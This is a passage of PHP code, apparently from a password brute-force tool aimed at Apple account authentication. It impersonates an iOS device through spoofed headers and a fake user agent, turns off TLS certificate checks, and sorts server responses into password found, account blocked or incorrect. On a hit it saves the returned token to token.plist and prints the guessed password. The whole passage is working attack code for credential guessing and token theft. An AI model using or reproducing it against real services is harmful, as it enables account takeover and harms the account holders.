curl_setopt($ch, CURLOPT_URL,$url); 
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch,CURLOPT_ENCODING, ''); 
curl_setopt($ch, CURLOPT_VERBOSE, true); 
curl_setopt($ch, CURLINFO_HEADER_OUT, true);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);    
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);   
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Accounts/113 CFNetwork/672.0.8 Darwin/14.0.0');  
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Proxy-Connection: keep-alive',
    'Accept: */*',
    'Accept-Encoding: gzip, deflate',               
    'Content-Type: text/plist',
    'Accept-Language: en-us',
    'X-MMe-Country: US',
    'X-MMe-Client-Info: <iPhone4,1> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 (com.apple.Accounts/113)>',
    'Content-length: ' . strlen($payload),
    'Connection: keep-alive'
));                                                

$got = 0;
$response = curl_exec($ch); 

$pos = 0;
$pos = strpos($response, "delegates");
if($pos > 0) {
	$got = 1;
	echo "<b>Password Found!!</b><br>";
}
         
$pos = 0;                              
$pos = strpos($response, "disabled");
if($pos > 0) {
	$got = 1;
	echo "<b>Account Blocked</b><br>";
	exit(0);
}

$pos = 0;
$pos = strpos($response, "incorrectly");
if($pos > 0) {
	$got = 1;
	echo "<b>Password Incorrect</b><br>";
}
 
if($got == 0) {
	echo $response;
	//echo "<br><br>Headers Debugging Info:<br></br>";
	//echo curl_getinfo($ch, CURLINFO_HEADER_OUT);
}

if ( $error = curl_error($ch) )
echo 'ERROR: ',$error;

curl_close($ch); 


if (strpos($response, "delegates") !== false)
    {
		echo "<center>Generating Token....</center>";
		file_put_contents('./token.plist', $response);
        echo "<center>Saved to Disk...</center>";
        die( "Success! The password is: {$line_of_text}" );
	
    }else{